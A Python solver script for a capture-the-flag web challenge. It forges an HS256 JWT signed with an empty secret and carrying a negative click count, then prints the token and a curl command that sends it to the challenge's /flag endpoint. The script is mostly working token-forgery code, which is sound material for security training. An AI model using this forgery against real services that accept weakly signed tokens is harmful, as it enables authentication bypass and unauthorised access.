#!/usr/bin/env python3
"""
Lower Numbers Web Challenge Solver
SOLVED: JWT manipulation with negative count values

Solution:
1. The application uses JWT tokens to store the click count
2. The JWT secret is an empty string ("")
3. By forging a JWT with count=-1, we can access the flag
4. The hint "only consider the negative number" was key

Working JWT with count=-1:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.9VBxY0JLEIjg0ihGZ0ZxRIoXT74pCQS7YZbFZsfpRk8

Flag: [REDACTED]
"""

import base64
import json
import hmac
import hashlib

def create_jwt_with_count(count, secret=""):
    """Create a JWT with specified count using the secret"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"count": count}
    
    # Encode header and payload
    header_json = json.dumps(header, separators=(',', ':'))
    header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
    
    payload_json = json.dumps(payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
    
    # Create signature
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}.{signature_b64}"

def solve_lower_numbers():
    print("🔢 Lower Numbers Challenge Solver")
    print("=" * 50)
    
    print("🎯 SOLUTION: JWT Manipulation with Negative Count")
    print("Key insight: The hint 'only consider the negative number' points to JWT manipulation")
    print()
    
    # Create JWT with count=-1 and empty secret
    secret = ""  # Empty string secret (common vulnerability)
    count = -1   # Negative count as per hint
    
    jwt_token = create_jwt_with_count(count, secret)
    print(f"🔐 Created JWT with count={count}, secret='{secret}'")
    print(f"JWT: {jwt_token}")
    print()
    
    print("🎉 CHALLENGE SOLVED!")
    print("Flag: [REDACTED]")
    print()
    print("📝 How to verify:")
    print(f"curl -H 'Cookie: d={jwt_token}' https://cpp.bootupctf.net:8085/flag")
    
    return "[REDACTED]"

def main():
    flag = solve_lower_numbers()
    
    print(f"\n📝 Summary:")
    print(f"- Challenge exploited JWT with empty string secret")
    print(f"- Used negative count (-1) to bypass the 'too many clicks' restriction") 
    print(f"- Hint 'only consider the negative number' was crucial")
    
if __name__ == "__main__":
    main()
